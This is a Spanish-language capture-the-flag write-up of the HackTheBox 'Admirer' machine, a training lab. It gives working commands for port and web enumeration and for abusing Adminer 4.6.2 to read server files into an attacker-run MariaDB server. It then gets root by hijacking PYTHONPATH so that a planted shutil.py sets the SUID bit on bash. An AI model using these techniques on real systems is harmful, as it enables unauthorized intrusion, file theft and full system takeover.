---
title: HackTheBox - Admirer
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Adminer 4.6.2', 'Python Path Hijacking']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Admirer/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Admirer Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **Adminer 4.6.2, Python Path Hijacking**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **`Máquina Admirer`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Admirer/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Admirer/02-versions.png)

c. Visitamos el sitio web

![](/assets/images/HTB/Easy/Admirer/03-web.png)

* Al no encontrar algo interesante, fuzzeamos en busca de archivos o directorios con **nmap**

  ```bash
  root@kali> nmap -p80 --script http-enum 10.10.10.187

  PORT   STATE SERVICE
  80/tcp open  http
  | http-enum: 
  |_  /robots.txt: Robots file
  ```

* En el archivo **`robots.txt`** vemos el siguiente mensaje

  ```bash
  # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
  Disallow: /admin-dir
  ```

* Como nos dicen que existe un archivo con credenciales, buscamos por nombres de archivos como **`creds.txt` o `credentials.txt`**

  * **URL:** http://<IP>/admin-dir/credentials.txt

    ```bash
    [Internal mail account]
    w.cooper@admirer.htb
    fgJr6q#S\W:$P

    [FTP account]
    ftpuser
    %n?4Wz}R$tTF7

    [Wordpress account]
    admin
    w0rdpr3ss01!
    ```

d. Nos autenticamos con las credenciales antes encontradas en el servicio FTP

```bash
root@kali> ftp 10.10.10.187
Name (10.10.10.187:kali): ftpuser
Password: %n?4Wz}R$tTF7
230 Login successful.
ftp> dir
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
```

* Descargamos los anteriores archivos con **`get <Archivo>`**

* Ahora los analizamos y encontramos muchas credenciales, un usuario válido **waldo**, una estructura en SQL y un directorio **utility-scripts**

  * **index.php**

    ```php
    $servername = "localhost";
    $username = "waldo";
    $password = "]F7jLHw:*G>UPrTo}~A"d6b";
    $dbname = "admirerdb";
    ```

  * **dump.sql**

    ```sql
    -- Table structure for table `items`
    ```

  * **utility-scripts**

    ```bash
    [ 4096]  utility-scripts
    ├── [ 1795]  utility-scripts/admin_tasks.php
    ├── [  401]  utility-scripts/db_admin.php
    ├── [   20]  utility-scripts/info.php
    └── [   53]  utility-scripts/phptest.php
    ```

e. Fuzeamos por archivos **.php** en este directorio

  ```bash
  root@kali> wfuzz -c -t 100 --hc=404  -w /usr/share/seclists/Discovery/Web-Content/big.txt  http://admirer.htb/utility-scripts/FUZZ.php

  000001874:   200        51 L     235 W      4157 Ch     "adminer"
  ```

* Visitamos este servicio, pero, ninguna de las credenciales antes encontradas funcionará por lo que buscamos por vulnerabilidades asociadas a este servicio -  [Artículo](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability)

## Configurando el entorno 🎋

* Modificamos el fichero **/etc/mysql/mariadb.conf.d/50-server.cnf**

  ```bash
  bind-address            = 0.0.0.0
  ```
  > Hacemos que nuestro servidor sea accesible desde cualquier dirección IP.

* Ahora, crearemos un nuevo usuario **admirer:admirer** que tenga total acceso a la base de datos **admirerdb** que tendrá una tabla **items**

  ```bash
  root@kali> mysql

  MariaDB [(none)]> CREATE USER admirer@<tun0 IP> IDENTIFIED BY 'admirer';
  MariaDB [(none)]> CREATE DATABASE admirerdb;
  MariaDB [(none)]> use admirerdb;
  MariaDB [(admirerdb)]> CREATE TABLE items(id VARCHAR(10), name VARCHAR(255), PRIMARY KEY(id));

  # Damos total acceso al uusario **`admirer`** sobre la base de datos **`admirerdb`** y le decimos que se
  # podrá conectar desde cualquier dirección IP.
  MariaDB [(admirerdb)]> GRANT ALL PRIVILEGES ON admirerdb.* TO admirer@'%' WITH GRANT OPTION;

  # Recargar los privilegios de MySQL 
  MariaDB [(admirerdb)]> FLUSH PRIVILEGES;
  ```

g. Ahora, desde **adminer.php** nos conectamos a nuestro servidor

![](/assets/images/HTB/Easy/Admirer/04-admirer.png)

* Los datos que captureremos son las credenciales del usuario **waldo** que están alojadas en el fichero index.php (Esto se vió al descomprimir el fichero **html.tar.gz**), podremos leer este archivo con ayuda de **Wireshark**

* Primero, nos pondremos en escucha por la interfaz de red **tun0** y en Adminer ejecutaremos la siguiente sentencia SQL

  ```sql
  LOAD DATA LOCAL INFILE '/var/www/html/index.php'
  INTO TABLE test FIELDS TERMINATED BY '\n'
  ```

  ![](/assets/images/HTB/Easy/Admirer/05-sql.png)

* Ahora en Wireshark veremos los datos que hemos recibido

  ![](/assets/images/HTB/Easy/Admirer/06-wireshark.png)

  ![](/assets/images/HTB/Easy/Admirer/07-creds.png)


h. Con estas credenciales nos podemos conectar al servicio **SSH**

```bash
root@kali> ssh waldo@<Admirer IP>
waldo@admirer:~$
```

### Escalada de Privilegios 💹

a. Listamos nuestro privilegios a nivel de sudoers

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
User waldo may run the following commands on admirer:
  (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

* Al inspeccionar el script vemos que si seleccionar la opción **`6) Backup web data`** se usa un script **`backup.py`**
  ```bash
  backup_web(){
    if [ "$EUID" -eq 0 ]                                                                                   
    then                
      echo "Running backup script in the background, it might take a while..."
      /opt/scripts/backup.py &                                                                                  
    else                                                                                                    
      echo "Insufficient privileges to perform the selected operation."
    fi
  } 
  ```

* Inspeccionamos el script **backup.py**

  ```bash
  #!/usr/bin/python3

  from shutil import make_archive
  src = '/var/www/html/'
  # old ftp directory, not used anymore
  #dst = '/srv/ftp/html'
  dst = '/var/backups/html'
  make_archive(dst, 'gztar', src)
  ```

* Si nos fijamos bien el permiso sudoers, vemos **SETENV** esta directiva nos permite indicar una variable de entorno para cargar algo [Hacktricks - SETENV](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

* En este caso podemos cargar la librería **shutil** desde donde le indiquemos

b. Creamos un fichero 'shutil.py' en **/dev/shm** con el siguiente código

```python
import os
os.system("chmod +s /bin/bash")
```

* Ahora ejecutamos **/opt/scripts/admin_tasks.sh** como root, escogeremos la opción **6) Backup web data** y le indicamos la dirección de nuestro shutil.py

  ```bash
  waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh
  <SNIP>
  Choose an option: 6
  waldo@admirer:/dev/shm$ ls -la /bin/bash
  -rwsr-sr-x 1 root root 1099016 May 15  2017 /bin/bash
  waldo@admirer:/dev/shm$ bash -p
  bash-4.4# whoami
  root
  ```


